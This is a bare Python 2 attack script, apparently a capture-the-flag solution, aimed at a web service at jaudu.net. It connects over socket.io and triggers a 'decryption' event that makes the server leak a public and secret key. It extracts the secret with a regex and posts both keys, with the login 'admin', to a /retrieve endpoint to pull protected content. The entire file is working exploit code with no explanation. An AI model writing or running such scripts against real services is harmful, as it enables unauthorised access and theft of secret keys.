#!/usr/bin/env python
from ws4py.client.threadedclient import WebSocketClient
import requests
import time
import json
import re
from unidecode import unidecode

url = 'http://jaudu.net/socket.io/1/'
command = '5:::{"name":"decryption"}'

r = requests.get(url)
wskey = r.text.split(':')[0]
print "Key: %s" % wskey


class JauduClient(WebSocketClient):
    secretresp = ''

    def opened(self):
        print "Conn opened"
        self.send(command)

    def closed(self, code, reason=None):
        print "Conn Closed"
        print code, reason

    def received_message(self, msg):
        if str(msg)[0] == '5':
            self.secretresp = msg.data[4:]


remotews = 'ws://jaudu.net/socket.io/1/websocket/'
ws = JauduClient(remotews + wskey)
try:
    ws.connect()
    time.sleep(1)
#    print "Secret: %s" % ws.secretresp
except KeyboardInterrupt:
    ws.close()


secretJSON = json.loads(ws.secretresp)
pubkey = secretJSON['args'][0]['public']
privkey = secretJSON['args'][0]['secret']
justkey = re.sub(r'.*value=\"(.*?)\" .*', r'\1', privkey)

print secretJSON
print "Pubkey: %s\nPrivkey: %s\nKey: %s" % (pubkey, privkey, justkey)

posturl = 'http://jaudu.net/retrieve'
res = requests.post(posturl, {
    'user[email]': 'admin',
    'user[password]': 'spam',
    'jaudu_public': pubkey,
    'jaudu_secret': justkey
    }
)
fout = open('result.html', 'wb')
fout.write(unidecode(res.text))
fout.close()
